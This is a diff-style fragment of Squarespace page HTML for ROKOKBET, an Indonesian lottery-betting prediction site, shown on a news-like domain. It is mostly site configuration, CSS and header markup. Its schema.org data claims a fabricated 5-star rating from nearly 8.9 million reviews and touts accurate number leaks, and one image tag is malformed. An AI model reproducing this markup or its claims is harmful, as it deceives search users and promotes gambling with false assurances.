"https://images.squarespace-cdn.com/content/v2/namespaces/memberAccountAvatars/libraries/65c59c43aeb76a63df61000a/eebe3831-3821-41a9-8818-bd08e148e29c/thirdPartyMemberAvatar-65c59c43aeb76a63df61000a-8626ef63-73bb-4e8a-9246-0b0e8a72310a?format=300w", "pseudonymAccount": false, "preferredLocale": "en-US" }, "authenticatedAccountWebsiteSettings": { "id": "65fd0f9fd4f37d0ac654bf8c" }, "permissions": { "permissions": { "1": true } }, "websiteRoles": { "1": true }, "accessPermissions": [1310, 1701, 1225, 1414, 1216, 1234, 1910, 1421, 1700, 1516, 1513, 1517, 1415, 1422, 1233, 1932, 1413, 1211, 1229, 1420, 1110, 1223, 1230, 1212, 1228, 12, 1210, 1512, 1111, 1226, 1418, 1214, 1419, 1912, 1112, 1410, 1224, 1611, 1921, 1219, 1220, 1311, 1423, 1515, 1612, 1213, 1411, 0, 1416, 1417, 15, 11, 13, 1412, 1930, 1931, 1911, 1514, 1610, 14, 1218, 1511, 1810, 1, 1510, 1221, 2066, 18, 1920, 1215, 1217], "memberAccountNames": { "65c59c43aeb76a63df61000a": { "avatarUrl": "https://images.squarespace-cdn.com/content/v2/namespaces/memberAccountAvatars/libraries/65c59c43aeb76a63df61000a/eebe3831-3821-41a9-8818-bd08e148e29c/thirdPartyMemberAvatar-65c59c43aeb76a63df61000a-8626ef63-73bb-4e8a-9246-0b0e8a72310a?format=300w", "bio": "", "displayName": "situs toto togel 4D" } }, "impersonatedSession": false, "demoCollections": [{ "collectionId": "624b3c75fa94ce68f1db3cfe", "deleted": false }, { "collectionId": "624b3c6dfa94ce68f1db3870", "deleted": false }, { "collectionId": "624b3c75fa94ce68f1db3ce1", "deleted": false }], "connectedAccounts": [], "tzData": { "zones": [[420, null, "WIB", null]], "rules": {} }, "product": { "variantAttributeNames": [], "variants": [{ "id": "28c210bc-2f66-4327-ac09-83b3f6cb6b13", "sku": "SQ1936194", "price": { "currencyCode": "IDR", "value": 888, "decimalValue": "10000.00", "fractionalDigits": 2 }, "salePrice": { "currencyCode": "IDR", "value": 0, "decimalValue": "0.00", "fractionalDigits": 2 }, "onSale": false, "stock": { "unlimited": true }, "attributes": {}, "shippingWeight": { "value": 0.0, "unit": "POUND" }, "shippingSize": { "unit": "INCH", "width": 0.0, "height": 0.0, "len": 0.0 } }], "subscribable": false, "fulfilledExternally": false, "productType": 1 }, "showAnnouncementBar": false, "recaptchaEnterpriseContext": { "recaptchaEnterpriseSiteKey": "6LdDFQwjAAAAAPigEvvPgEVbb7QBm-TkVJdDTlAv" }, "i18nContext": { "timeZoneData": { "id": "Asia/Jakarta", "name": "Western Indonesia Time" } } };</script>
+    <script
+      type="application/ld+json">{"url":"https://soonews.ca/","name":"ROKOKBET","description":"","image":"https://res.cloudinary.com/dqkin28uq/image/upload/v1728160488/rokokbet-logo_0_odxbog.png","@context":"http://schema.org","@type":"WebSite"}</script>
+    <script
+      type="application/ld+json">{"name":"ROKOKBET # Link Prediksi Togel HK Akurat & Syair HK Jitu Dan Bocoran HK Hari Ini \u2014 ROKOKBET","image":"https://res.cloudinary.com/dqkin28uq/image/upload/v1731518613/Untitled-1_o1bmkf.jpg","description":"Prediksi ROKOKBET adalah penyedia bocoran angka hk dan syair angka hk yang sangat jitu dan akurat dalam menyediakan 2D 3D 4D yang terlengkap di setiap pasaran togelnya.","brand":"ROKOKBET","offers":{"price":888.00,"priceCurrency":"IDR","url":"https://soonews.ca/","availability":"InStock","sku":"SQ1936194","@context":"http://schema.org","@type":"Offer"},"@context":"http://schema.org","@type":"Product"}</script>
+    <link rel="stylesheet" type="text/css"
+      href="https://static1.squarespace.com/static/versioned-site-css/65fd0f981ec2594cc8fa0178/1/5c5a519771c10ba3470d8101/65fd0f981ec2594cc8fa0180/1506/site.css" />
+    <script>Static.COOKIE_BANNER_CAPABLE = true;</script>
+    <!-- End of Squarespace Headers -->
+          <style>
+            @supports (-webkit-backdrop-filter: none) or (backdrop-filter: none) {
+              .header-blur-background {}
+            }
+            .ProductItem-gallery-slides-item.selected.going-next.loaded.next-loaded.prev-loaded {
+      width: auto;
+      height: auto;
+  }
+  .tweak-fixed-header .header .header-announcement-bar-wrapper {
+
+      background: linear-gradient(89.87deg, #000 35.41%, #000000 121.72%);
+  }
+  .collection-type-products .ProductItem-details h1.ProductItem-details-title {
+      font-family: exo;
+  }
+  footer#footer-sections {
+      background: linear-gradient(89.87deg, #000 35.41%, #000000 121.72%);
+      color: white;
+      font-family: arial;
+      text-align: center;
+      padding: 30px 0px 30px 0px;
+  }
+  .products.collection-content-wrapper {
+      padding-bottom: 0vw;
+  }
+  .ProductItem {
+      padding-bottom: 0vw;
+  }
+  .header-nav-item.header-nav-item--collection a, .header-nav-item.header-nav-item--collection.header-nav-item--active a {
+      color: white;
+  }
+  .n-columns-2 {
+      display: grid;
+      grid-template-columns: repeat(2,1fr);
+      font-weight: 700;
+    }
+    .n-columns-2 a {
+      text-align: center;
+    }
+    .login, .register {
+      color: #fff;
+      padding: 13px 10px;
+    }
+    .login, .login-button {
+      background: linear-gradient(to bottom, #e69539 0%, #d4b83b 100%);
+      border: 2px solid #f6c620;
+      box-shadow: 0px 0px 3px #f00;
+    }
+    .register, .register-button {
+      background: linear-gradient(to bottom, #e69539 0%, #d4b83b 100%);
+      border: 2px solid #f6c620;
+      box-shadow: 0px 0px 3px #f00;
+    }
+          </style>
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "SoftwareApplication",
+      "name": "ROKOKBET",
+      "operatingSystem": "ANDROID",
+      "applicationCategory": "GameApplication",
+      "aggregateRating": {
+        "@type": "AggregateRating",
+        "ratingValue": "5",
+        "ratingCount": "8899888"
+      },
+      "offers": {
+        "@type": "Offer",
+        "price": "0.00",
+        "priceCurrency": "IDR"
+      }
+    }
+    </script>
+  <script  type="text/javascript"  src="/yhBH4lnOjWpDoOUq"></script><script  type="text/javascript"  src="/09Vl3QKvrlWHz-tR"></script></head>
+
+  <body id="item-65fd0fc7db01f63c712f258e" class="
+        primary-button-style-solid primary-button-shape-square secondary-button-style-outline secondary-button-shape-square tertiary-button-style-solid tertiary-button-shape-square  form-field-style-solid form-field-shape-square form-field-border-all form-field-checkbox-type-icon form-field-checkbox-fill-solid form-field-checkbox-color-inverted form-field-checkbox-shape-square form-field-checkbox-layout-stack form-field-radio-type-icon form-field-radio-fill-solid form-field-radio-color-normal form-field-radio-shape-pill form-field-radio-layout-stack form-field-survey-fill-solid form-field-survey-color-normal form-field-survey-shape-pill form-field-hover-focus-outline form-submit-button-style-label header-overlay-alignment-center header-width-inset tweak-transparent-header tweak-fixed-header tweak-fixed-header-style-basic tweak-blog-alternating-side-by-side-width-full tweak-blog-alternating-side-by-side-image-aspect-ratio-11-square tweak-blog-alternating-side-by-side-text-alignment-left tweak-blog-alternating-side-by-side-read-more-style-show tweak-blog-alternating-side-by-side-image-text-alignment-middle tweak-blog-alternating-side-by-side-delimiter-bullet tweak-blog-alternating-side-by-side-meta-position-top tweak-blog-alternating-side-by-side-primary-meta-categories tweak-blog-alternating-side-by-side-secondary-meta-date tweak-blog-alternating-side-by-side-excerpt-show tweak-blog-basic-grid-width-full tweak-blog-basic-grid-image-aspect-ratio-32-standard tweak-blog-basic-grid-text-alignment-left tweak-blog-basic-grid-delimiter-bullet tweak-blog-basic-grid-image-placement-above tweak-blog-basic-grid-read-more-style-show tweak-blog-basic-grid-primary-meta-categories tweak-blog-basic-grid-secondary-meta-date tweak-blog-basic-grid-excerpt-show tweak-blog-item-width-medium tweak-blog-item-text-alignment-left tweak-blog-item-meta-position-above-title tweak-blog-item-show-categories tweak-blog-item-show-date tweak-blog-item-show-author-name tweak-blog-item-show-author-profile tweak-blog-item-delimiter-bullet tweak-blog-masonry-width-full tweak-blog-masonry-text-alignment-left tweak-blog-masonry-primary-meta-categories tweak-blog-masonry-secondary-meta-date tweak-blog-masonry-meta-position-top tweak-blog-masonry-read-more-style-show tweak-blog-masonry-delimiter-space tweak-blog-masonry-image-placement-above tweak-blog-masonry-excerpt-show tweak-blog-side-by-side-width-full tweak-blog-side-by-side-image-placement-left tweak-blog-side-by-side-image-aspect-ratio-11-square tweak-blog-side-by-side-primary-meta-categories tweak-blog-side-by-side-secondary-meta-date tweak-blog-side-by-side-meta-position-top tweak-blog-side-by-side-text-alignment-left tweak-blog-side-by-side-image-text-alignment-middle tweak-blog-side-by-side-read-more-style-show tweak-blog-side-by-side-delimiter-bullet tweak-blog-side-by-side-excerpt-show tweak-blog-single-column-width-full tweak-blog-single-column-text-alignment-center tweak-blog-single-column-image-placement-above tweak-blog-single-column-delimiter-bullet tweak-blog-single-column-read-more-style-show tweak-blog-single-column-primary-meta-categories tweak-blog-single-column-secondary-meta-date tweak-blog-single-column-meta-position-top tweak-blog-single-column-content-full-post tweak-events-stacked-width-full tweak-events-stacked-height-large  tweak-events-stacked-show-thumbnails tweak-events-stacked-thumbnail-size-32-standard tweak-events-stacked-date-style-with-text tweak-events-stacked-show-time tweak-events-stacked-show-location  tweak-events-stacked-show-excerpt   tweak-global-animations-complexity-level-detailed tweak-global-animations-animation-style-fade tweak-global-animations-animation-type-none tweak-global-animations-animation-curve-ease tweak-portfolio-grid-basic-width-full tweak-portfolio-grid-basic-height-large tweak-portfolio-grid-basic-image-aspect-ratio-11-square tweak-portfolio-grid-basic-text-alignment-left tweak-portfolio-grid-basic-hover-effect-fade tweak-portfolio-grid-overlay-width-full tweak-portfolio-grid-overlay-height-large tweak-portfolio-grid-overlay-image-aspect-ratio-11-square tweak-portfolio-grid-overlay-text-placement-center tweak-portfolio-grid-overlay-show-text-after-hover tweak-portfolio-index-background-link-format-stacked tweak-portfolio-index-background-width-full tweak-portfolio-index-background-height-large  tweak-portfolio-index-background-vertical-alignment-middle tweak-portfolio-index-background-horizontal-alignment-center tweak-portfolio-index-background-delimiter-none tweak-portfolio-index-background-animation-type-fade tweak-portfolio-index-background-animation-duration-medium tweak-portfolio-hover-follow-layout-inline  tweak-portfolio-hover-follow-delimiter-forward-slash tweak-portfolio-hover-follow-animation-type-fade tweak-portfolio-hover-follow-animation-duration-medium tweak-portfolio-hover-static-layout-stacked  tweak-portfolio-hover-static-delimiter-forward-slash tweak-portfolio-hover-static-animation-type-scale-up tweak-portfolio-hover-static-animation-duration-medium tweak-product-basic-item-product-variant-display-button tweak-product-basic-item-width-inset tweak-product-basic-item-gallery-aspect-ratio-23-standard-vertical tweak-product-basic-item-text-alignment-left tweak-product-basic-item-navigation-none tweak-product-basic-item-content-alignment-top tweak-product-basic-item-gallery-design-slideshow tweak-product-basic-item-gallery-placement-right tweak-product-basic-item-thumbnail-placement-side tweak-product-basic-item-click-action-none tweak-product-basic-item-hover-action-none tweak-product-basic-item-variant-picker-layout-dropdowns tweak-products-width-inset tweak-products-image-aspect-ratio-34-three-four-vertical tweak-products-text-alignment-middle  tweak-products-price-hide tweak-products-nested-category-type-top  tweak-products-header-text-alignment-middle tweak-products-breadcrumbs image-block-poster-text-alignment-left image-block-card-content-position-center image-block-card-text-alignment-left image-block-overlap-content-position-center image-block-overlap-text-alignment-left image-block-collage-content-position-center image-block-collage-text-alignment-left image-block-stack-text-alignment-left hide-opentable-icons opentable-style-dark tweak-product-quick-view-button-style-floating tweak-product-quick-view-button-position-bottom tweak-product-quick-view-lightbox-excerpt-display-truncate tweak-product-quick-view-lightbox-show-arrows tweak-product-quick-view-lightbox-show-close-button tweak-product-quick-view-lightbox-controls-weight-light native-currency-code-idr view-item collection-layout-default collection-type-products collection-65fd0fc2aa1d0858f5af2fe4 mobile-style-available sqs-seven-one
+          show-pdp-product-add-ons
+      " data-description="plp-mobile-editor-column" tabindex="-1">
+    <div id="siteWrapper" class="clearfix site-wrapper">
+      <header data-test="header" id="header" class="
+        header theme-col--primary
+      " data-section-theme="" data-controller="Header" data-current-styles="{
+                                                              &quot;layout&quot;: &quot;brandingCenter&quot;,
+                                                              &quot;action&quot;: {
+                                                                &quot;buttonText&quot;: &quot;Get Started&quot;,
+                                                                &quot;newWindow&quot;: false
+                                                              },
+                                                              &quot;showSocial&quot;: false,
+                                                              &quot;socialOptions&quot;: {
+                                                                &quot;socialBorderShape&quot;: &quot;none&quot;,
+                                                                &quot;socialBorderStyle&quot;: &quot;outline&quot;,
+                                                                &quot;socialBorderThickness&quot;: {
+                                                                  &quot;unit&quot;: &quot;px&quot;,
+                                                                  &quot;value&quot;: 1.0
+                                                                }
+                                                              },
+                                                              &quot;menuOverlayAnimation&quot;: &quot;fade&quot;,
+                                                              &quot;cartStyle&quot;: &quot;cart&quot;,
+                                                              &quot;cartText&quot;: &quot;Cart&quot;,
+                                                              &quot;showEmptyCartState&quot;: true,
+                                                              &quot;cartOptions&quot;: {
+                                                                &quot;iconType&quot;: &quot;solid-7&quot;,&quot;cartBorderShape&quot;: &quot;none&quot;,
+                                                                &quot;cartBorderStyle&quot;: &quot;outline&quot;,
+                                                                &quot;cartBorderThickness&quot;: {
+                                                                  &quot;unit&quot;: &quot;px&quot;,
+                                                                  &quot;value&quot;: 1.0
+                                                                }
+                                                              },
+                                                              &quot;showButton&quot;: false,
+                                                              &quot;showCart&quot;: true,
+                                                              &quot;showAccountLogin&quot;: false,
+                                                              &quot;headerStyle&quot;: &quot;dynamic&quot;,
+                                                              &quot;languagePicker&quot;: {&quot;enabled&quot;: false,
+                                                                &quot;iconEnabled&quot;: false,
+                                                                &quot;iconType&quot;: &quot;globe&quot;,
+                                                                &quot;flagShape&quot;: &quot;shiny&quot;,
+                                                                &quot;languageFlags&quot;: [ ]
+                                                              },
+                                                              &quot;mobileOptions&quot;: {
+                                                                &quot;layout&quot;: &quot;logoCenterNavLeft&quot;,
+                                                                &quot;menuIcon&quot;: &quot;doubleLineHamburger&quot;,
+                                                                &quot;menuIconOptions&quot;: {
+                                                                  &quot;style&quot;: &quot;doubleLineHamburger&quot;,
+                                                                  &quot;thickness&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 1.0
+                                                                  }
+                                                                }
+                                                              },
+                                                              &quot;dynamicOptions&quot;: {
+                                                                &quot;border&quot;: {
+                                                                  &quot;enabled&quot;: false,
+                                                                  &quot;position&quot;: &quot;allSides&quot;,
+                                                                  &quot;thickness&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 4.0
+                                                                  },
+                                                                  &quot;color&quot;: {
+                                                                    &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                    &quot;sitePaletteColor&quot;: {
+                                                                      &quot;colorName&quot;: &quot;black&quot;,
+                                                                      &quot;alphaModifier&quot;: 1.0
+                                                                    }
+                                                                  }
+                                                                }
+                                                              },
+                                                              &quot;solidOptions&quot;: {
+                                                                &quot;headerOpacity&quot;: {
+                                                                  &quot;unit&quot;: &quot;%&quot;,
+                                                                  &quot;value&quot;: 100.0
+                                                                },
+                                                                &quot;border&quot;: {
+                                                                  &quot;enabled&quot;: false,
+                                                                  &quot;position&quot;: &quot;allSides&quot;,
+                                                                  &quot;thickness&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 4.0
+                                                                  },
+                                                                  &quot;color&quot;: {
+                                                                    &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                    &quot;sitePaletteColor&quot;: {
+                                                                      &quot;colorName&quot;: &quot;black&quot;,
+                                                                      &quot;alphaModifier&quot;: 1.0
+                                                                    }
+                                                                  }
+                                                                },
+                                                                &quot;dropShadow&quot;: {
+                                                                  &quot;enabled&quot;: false,
+                                                                  &quot;blur&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 30.0
+                                                                  },
+                                                                  &quot;spread&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 0.0
+                                                                  },
+                                                                  &quot;distance&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 0.0
+                                                                  },
+                                                                  &quot;color&quot;: {
+                                                                    &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                    &quot;sitePaletteColor&quot;: {
+                                                                      &quot;colorName&quot;: &quot;black&quot;,
+                                                                      &quot;alphaModifier&quot;: 1.0
+                                                                    }
+                                                                  }
+                                                                },
+                                                                &quot;blurBackground&quot;: {
+                                                                  &quot;enabled&quot;: false,
+                                                                  &quot;blurRadius&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 12.0}
+                                                                },
+                                                                &quot;backgroundColor&quot;: {
+                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                  &quot;sitePaletteColor&quot;: {
+                                                                    &quot;colorName&quot;: &quot;white&quot;,
+                                                                    &quot;alphaModifier&quot;: 1.0
+                                                                  }
+                                                                },
+                                                                &quot;navigationColor&quot;: {
+                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                  &quot;sitePaletteColor&quot;: {
+                                                                    &quot;colorName&quot;: &quot;black&quot;,
+                                                                    &quot;alphaModifier&quot;: 1.0
+                                                                  }
+                                                                }
+                                                              },
+                                                              &quot;gradientOptions&quot;: {
+                                                                &quot;gradientType&quot;: &quot;faded&quot;,
+                                                                &quot;headerOpacity&quot;: {
+                                                                  &quot;unit&quot;: &quot;%&quot;,
+                                                                  &quot;value&quot;: 90.0
+                                                                },
+                                                                &quot;border&quot;: {
+                                                                  &quot;enabled&quot;: false,
+                                                                  &quot;position&quot;: &quot;allSides&quot;,
+                                                                  &quot;thickness&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 4.0
+                                                                  },
+                                                                  &quot;color&quot;: {
+                                                                    &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                    &quot;sitePaletteColor&quot;: {
+                                                                      &quot;colorName&quot;: &quot;black&quot;,
+                                                                      &quot;alphaModifier&quot;: 1.0
+                                                                    }
+                                                                  }
+                                                                },
+                                                                &quot;dropShadow&quot;: {
+                                                                  &quot;enabled&quot;: false,
+                                                                  &quot;blur&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 30.0
+                                                                  },
+                                                                  &quot;spread&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 0.0
+                                                                  },
+                                                                  &quot;distance&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 0.0
+                                                                  },
+                                                                  &quot;color&quot;: {
+                                                                    &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                    &quot;sitePaletteColor&quot;: {
+                                                                      &quot;colorName&quot;: &quot;black&quot;,
+                                                                      &quot;alphaModifier&quot;: 1.0
+                                                                    }
+                                                                  }
+                                                                },
+                                                                &quot;blurBackground&quot;: {
+                                                                  &quot;enabled&quot;: false,
+                                                                  &quot;blurRadius&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 12.0
+                                                                  }
+                                                                },
+                                                                &quot;backgroundColor&quot;: {
+                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                  &quot;sitePaletteColor&quot;: {
+                                                                    &quot;colorName&quot;: &quot;white&quot;,
+                                                                    &quot;alphaModifier&quot;: 1.0
+                                                                  }
+                                                                },
+                                                                &quot;navigationColor&quot;: {
+                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                  &quot;sitePaletteColor&quot;: {
+                                                                    &quot;colorName&quot;: &quot;black&quot;,
+                                                                    &quot;alphaModifier&quot;: 1.0
+                                                                  }
+                                                                }
+                                                              },
+                                                              &quot;dropShadowOptions&quot;: {
+                                                                &quot;enabled&quot;: false,
+                                                                &quot;blur&quot;: {
+                                                                  &quot;unit&quot;: &quot;px&quot;,
+                                                                  &quot;value&quot;: 12.0
+                                                                },
+                                                                &quot;spread&quot;: {
+                                                                  &quot;unit&quot;: &quot;px&quot;,
+                                                                  &quot;value&quot;: 0.0
+                                                                },
+                                                                &quot;distance&quot;: {
+                                                                  &quot;unit&quot;: &quot;px&quot;,
+                                                                  &quot;value&quot;: 12.0
+                                                                }
+                                                              },
+                                                              &quot;borderOptions&quot;: {
+                                                                &quot;enabled&quot;: false,
+                                                                &quot;position&quot;: &quot;allSides&quot;,
+                                                                &quot;thickness&quot;: {
+                                                                  &quot;unit&quot;: &quot;px&quot;,
+                                                                  &quot;value&quot;: 4.0},
+                                                                &quot;color&quot;: {
+                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                  &quot;sitePaletteColor&quot;: {
+                                                                    &quot;colorName&quot;: &quot;black&quot;,
+                                                                    &quot;alphaModifier&quot;: 1.0
+                                                                  }
+                                                                }
+                                                              },
+                                                              &quot;showPromotedElement&quot;: false,
+                                                              &quot;buttonVariant&quot;: &quot;primary&quot;,
+                                                              &quot;blurBackground&quot;: {
+                                                                &quot;enabled&quot;: false,
+                                                                &quot;blurRadius&quot;: {
+                                                                  &quot;unit&quot;: &quot;px&quot;,
+                                                                  &quot;value&quot;: 12.0
+                                                                }
+                                                              },
+                                                              &quot;headerOpacity&quot;: {
+                                                                &quot;unit&quot;: &quot;%&quot;,
+                                                                &quot;value&quot;: 100.0
+                                                              }
+                                                            }" data-section-id="header" data-header-theme=""
+        data-menu-overlay-theme="" data-header-style="dynamic" data-language-picker="{
+                                                              &quot;enabled&quot;: false,
+                                                              &quot;iconEnabled&quot;: false,
+                                                              &quot;iconType&quot;: &quot;globe&quot;,
+                                                              &quot;flagShape&quot;: &quot;shiny&quot;,
+                                                              &quot;languageFlags&quot;: [ ]
+                                                            }" data-first-focusable-element tabindex="-1" style="
+        
+          
+          
+            --headerBorderColor: hsla(var(--black-hsl), 1);
+          
+        
+        
+          --solidHeaderBackgroundColor: hsla(var(--white-hsl), 1);
+        
+        
+          --solidHeaderNavigationColor: hsla(var(--black-hsl), 1);
+        
+        
+          --gradientHeaderBackgroundColor: hsla(var(--white-hsl), 1);
+        
+        
+          --gradientHeaderNavigationColor: hsla(var(--black-hsl), 1);
+        
+      ">
+
+        <div class="sqs-announcement-bar-dropzone"></div>
+
+        <div class="header-announcement-bar-wrapper">
+
+          <a href="#page" class="header-skip-link sqs-button-element--primary">
+            Skip to Content
+          </a>
+
+
+
+
+          <div class="header-border" data-header-style="dynamic" data-header-usability-enabled="true"
+            data-header-border="false" data-test="header-border" style="
+
+
+
+
+
+
+    
+      border-width: 0px !important;
+    
+
+
+
+    
+
+
+
+  "></div>
+          <div class="header-dropshadow" data-header-style="dynamic" data-header-usability-enabled="true"
+            data-header-dropshadow="false" data-test="header-dropshadow" style="
+
+
+    
+  "></div>
+
+
+
+          <div class='header-inner container--fluid
+          
+            header-layout--with-commerce
+          
+          
+          
+          
+          
+          
+          
+          header-mobile-layout-logo-center-nav-left
+          
+          
+          
+          
+          
+          header-layout-branding-center
+          
+          
+          
+          
+          
+          ' style="
+
+
+
+
+
+
+    
+      padding: 0;
+    
+
+
+
+  " data-test="header-inner">
+            <!-- Background -->
+            <div class="header-background theme-bg--primary"></div>
+
+            <div class="header-display-desktop" data-content-field="site-title">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+              <style>
+                .top-bun,
+                .patty,
+                .bottom-bun {
+                  height: 1px;
+                }
+              </style>
+
+              <!-- Burger -->
+              <div class="header-burger
+
+    menu-overlay-does-not-have-visible-non-navigation-items
+
+
+    
+    no-actions
+    
+  " data-animation-role="header-element">
+                <button class="header-burger-btn burger" data-test="header-burger">
+                  <span hidden class="js-header-burger-open-title visually-hidden">Open Menu</span>
+                  <span hidden class="js-header-burger-close-title visually-hidden">Close Menu</span>
+                  <div class="burger-box">
+                    <div class="burger-inner header-menu-icon-doubleLineHamburger">
+                      <div class="top-bun"></div>
+                      <div class="patty"></div>
+                      <div class="bottom-bun"></div>
+                    </div>
+                  </div>
+                </button>
+              </div>
+
+
+              <!-- Social -->
+
+
+
+              <!-- Title and nav wrapper -->
+              <div class="header-title-nav-wrapper">
+
+
+
+
+
+
+                <!-- Nav -->
+                <div class="header-nav">
+                  <div class="header-nav-wrapper">
+                    <nav class="header-nav-list">
+
+
+
+
+                      <div class="header-nav-item header-nav-item--collection header-nav-item--active">
+                        <a href="https://soonews.ca/" title="ROKOKBET">ROKOKBET</a>
+                      </div>
+
+
+
+
+
+
+                      <div class="header-nav-item header-nav-item--collection">
+                        <a href="https://soonews.ca/" title="Situs Togel">Situs Togel</a>
+                      </div>
+
+
+
+
+
+
+                      <div class="header-nav-item header-nav-item--collection">
+                        <a href="https://soonews.ca/" title="Togel Online">Togel Online</a>
+                      </div>
+
+
+
+
+
+
+                    </nav>
+                  </div>
+                </div>
+
+
+                <!-- Title -->
+
+                <div class="
+                        header-title
+                        
+                      " data-animation-role="header-element">
+
+                  <div class="header-title-logo">
+                    <a href="https://soonews.ca/" data-animation-role="header-element">
+
+                      <img elementtiming="nbf-header-logo-desktop"
+                        src="https://res.cloudinary.com/dqkin28uq/image/upload/v1728160488/rokokbet-logo_0_odxbog.png"async" alt="ROKOKBET # Link Prediksi Togel HK Akurat & Syair HK Jitu Dan Bocoran HK Hari Ini" src="https://res.cloudinary.com/dqkin28uq/image/upload/v1728160488/rokokbet-logo_0_odxbog.png" class="i-amphtml-fill-content i-amphtml-replaced-content" i-amphtml-auto-lightbox-visited="">"
+                        alt="ROKOKBET" style="display:block" fetchpriority="high" loading="eager" decoding="async"
+                        data-loader="raw">
+
+                    </a>
+                  </div>
+
+
+
+                </div>
+
+
+
+              </div>
+
+
+              <!-- Actions -->
+              <div class="header-actions header-actions--right">
+                <div class="showOnMobile">
+
+
+
+
+
+
+                  <div class="header-actions-action header-actions-action--cart">
+                    <a href="/cart"
+                      class="cart-style-icon icon--stroke icon--fill icon--cart sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline">
+                      <span class="Cart-inner">
+
+
+
+
+                        <svg class="icon icon--cart" width="61" height="49" viewBox="0 0 61 49">
+                          <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M0.5 2C0.5 1.17157 1.17157 0.5 2 0.5H13.6362C14.3878 0.5 15.0234 1.05632 15.123 1.80135L16.431 11.5916H59C59.5122 11.5916 59.989 11.8529 60.2645 12.2847C60.54 12.7165 60.5762 13.2591 60.3604 13.7236L50.182 35.632C49.9361 36.1614 49.4054 36.5 48.8217 36.5H18.0453C17.2937 36.5 16.6581 35.9437 16.5585 35.1987L12.3233 3.5H2C1.17157 3.5 0.5 2.82843 0.5 2ZM16.8319 14.5916L19.3582 33.5H47.8646L56.6491 14.5916H16.8319Z" />
+                          <path d="M18.589 35H49.7083L60 13H16L18.589 35Z" />
+                          <path
+                            d="M21 49C23.2091 49 25 47.2091 25 45C25 42.7909 23.2091 41 21 41C18.7909 41 17 42.7909 17 45C17 47.2091 18.7909 49 21 49Z" />
+                          <path
+                            d="M45 49C47.2091 49 49 47.2091 49 45C49 42.7909 47.2091 41 45 41C42.7909 41 41 42.7909 41 45C41 47.2091 42.7909 49 45 49Z" />
+                        </svg>
+
+                        <div class="icon-cart-quantity">
+
+                          <span class="cart-quantity-container">
+
+                            <span class="sqs-cart-quantity">0</span>
+
+                          </span>
+
+                        </div>
+                      </span>
+                    </a>
+                  </div>
+
+
+
+
+
+
+                </div>
+
+
+                <div class="showOnDesktop">
+
+
+
+
+
+
+                  <div class="header-actions-action header-actions-action--cart">
+                    <a href="/cart"
+                      class="cart-style-icon icon--stroke icon--fill icon--cart sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline">
+                      <span class="Cart-inner">
+
+
+
+
+                        <svg class="icon icon--cart" width="61" height="49" viewBox="0 0 61 49">
+                          <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M0.5 2C0.5 1.17157 1.17157 0.5 2 0.5H13.6362C14.3878 0.5 15.0234 1.05632 15.123 1.80135L16.431 11.5916H59C59.5122 11.5916 59.989 11.8529 60.2645 12.2847C60.54 12.7165 60.5762 13.2591 60.3604 13.7236L50.182 35.632C49.9361 36.1614 49.4054 36.5 48.8217 36.5H18.0453C17.2937 36.5 16.6581 35.9437 16.5585 35.1987L12.3233 3.5H2C1.17157 3.5 0.5 2.82843 0.5 2ZM16.8319 14.5916L19.3582 33.5H47.8646L56.6491 14.5916H16.8319Z" />
+                          <path d="M18.589 35H49.7083L60 13H16L18.589 35Z" />
+                          <path
+                            d="M21 49C23.2091 49 25 47.2091 25 45C25 42.7909 23.2091 41 21 41C18.7909 41 17 42.7909 17 45C17 47.2091 18.7909 49 21 49Z" />
+                          <path
+                            d="M45 49C47.2091 49 49 47.2091 49 45C49 42.7909 47.2091 41 45 41C42.7909 41 41 42.7909 41 45C41 47.2091 42.7909 49 45 49Z" />
+                        </svg>
+
+                        <div class="icon-cart-quantity">
+
+                          <span class="cart-quantity-container">
+
+                            <span class="sqs-cart-quantity">0</span>
+
+                          </span>
+
+                        </div>
+                      </span>
+                    </a>
+                  </div>
+
+
+
+
+
+
+                </div>
+
+
+              </div>
+
+
+
+
+
+
+
+            </div>
+            <div class="header-display-mobile" data-content-field="site-title">
+
+
+
+
+
+              <!-- Social -->
+
+
+
+
+
+              <style>
+                .top-bun,
+                .patty,
+                .bottom-bun {
+                  height: 1px;
+                }
+          .header-title-logo a{
+          max-height: 7rem !important;
+      }
+      .header-title-logo img {
+      max-height: 7rem !important;
+  }
+              </style>
+
